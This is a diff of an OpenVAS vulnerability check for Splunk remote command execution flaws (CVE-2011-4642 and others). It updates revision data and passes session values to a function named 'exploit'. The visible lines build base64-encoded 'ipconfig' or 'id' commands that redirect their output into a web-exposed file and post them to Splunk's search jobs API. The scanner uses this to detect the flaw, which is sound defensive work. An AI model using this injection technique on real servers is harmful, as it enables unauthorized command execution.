@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_splunk_multiple_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
+# $Id: secpod_splunk_multiple_vuln.nasl 7573 2017-10-26 09:18:50Z cfischer $
 #
 # Splunk Multiple Vulnerabilities
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902801");
-  script_version("$Revision: 7044 $");
+  script_version("$Revision: 7573 $");
   script_cve_id("CVE-2011-4642", "CVE-2011-4643", "CVE-2011-4644", "CVE-2011-4778");
   script_bugtraq_id(51061);
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-10-26 11:18:50 +0200 (Thu, 26 Oct 2017) $");
   script_tag(name:"creation_date", value:"2011-12-22 11:11:11 +0530 (Thu, 22 Dec 2011)");
   script_name("Splunk Multiple Vulnerabilities");
 
@@ -82,7 +82,7 @@ include("version_func.inc");
 include("http_keepalive.inc");
 
 ## Build Exploit
-function exploit(command)
+function exploit(command , xsplunk, session)
 {
   url = "/en-GB/api/search/jobs";
 
@@ -163,13 +163,13 @@ if("windows" >< tolower(os))
   tmp = string('>"', "c:\\program files\\splunk\\share\\splunk\\search_",
                "mrsparkle\\exposed\\js\\.tmp",'"');
   command =  urlencode(str:base64(str: string("ipconfig", tmp)));
-  req = exploit(command:command);
+  req = exploit(command:command, xsplunk:xsplunk, session:session);
 }
 else
 {
   tmp = ">/opt/splunk/share/splunk/search_mrsparkle/exposed/js/.tmp";
   command =  urlencode(str:base64(str: string("id", tmp)));
-  req = exploit(command:command);
+  req = exploit(command:command, xsplunk:xsplunk, session:session);
 }
 
 ## Send crafted POST request and receive the response
